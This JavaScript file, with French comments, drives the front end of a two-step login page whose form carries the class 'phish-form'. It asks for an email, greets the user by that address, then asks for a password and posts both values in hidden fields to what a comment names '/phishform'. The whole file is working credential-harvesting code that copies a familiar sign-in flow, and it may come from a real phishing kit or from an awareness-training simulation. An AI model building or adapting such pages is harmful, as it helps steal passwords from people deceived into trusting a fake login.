document.addEventListener('DOMContentLoaded', function () {
  const nextButton = document.getElementById('next-button');
  const emailStep = document.getElementById('email-step');
  const passwordStep = document.getElementById('password-step');
  const emailInput = document.getElementById('email-input');
  const passwordInput = document.getElementById('password-input');
  const userEmailDisplay = document.getElementById('user-email-display');
  const loginSubtitle = document.getElementById('login-subtitle');
  const form = document.querySelector('.phish-form');

  let step = 1;

  nextButton.addEventListener('click', function (e) {
    if (step === 1) {
      e.preventDefault(); // Ne pas envoyer le formulaire tout de suite

      const email = emailInput.value.trim();
      if (email === "") {
        alert("Veuillez entrer votre adresse e-mail");
        return;
      }

      userEmailDisplay.textContent = email;
      loginSubtitle.textContent = `Bienvenue ${email}`;
      emailStep.style.display = 'none';
      passwordStep.style.display = 'block';
      nextButton.textContent = 'Se connecter';
      passwordInput.focus();
      step = 2;
    } else {
      const password = passwordInput.value.trim();
      if (password === "") {
        alert("Veuillez entrer votre mot de passe");
        return;
      }

      // Créer dynamiquement les champs à envoyer
      const hiddenEmail = document.createElement('input');
      hiddenEmail.type = 'hidden';
      hiddenEmail.name = 'email';
      hiddenEmail.value = emailInput.value.trim();

      const hiddenPassword = document.createElement('input');
      hiddenPassword.type = 'hidden';
      hiddenPassword.name = 'password';
      hiddenPassword.value = passwordInput.value.trim();

      form.appendChild(hiddenEmail);
      form.appendChild(hiddenPassword);

      form.submit(); // Envoi vers /phishform
    }
  });

  // Entrée pour email
  emailInput.addEventListener('keypress', function (e) {
    if (e.key === 'Enter') {
      e.preventDefault();
      nextButton.click();
    }
  });

  // Entrée pour mot de passe
  passwordInput.addEventListener('keypress', function (e) {
    if (e.key === 'Enter') {
      e.preventDefault();
      nextButton.click();
    }
  });
});
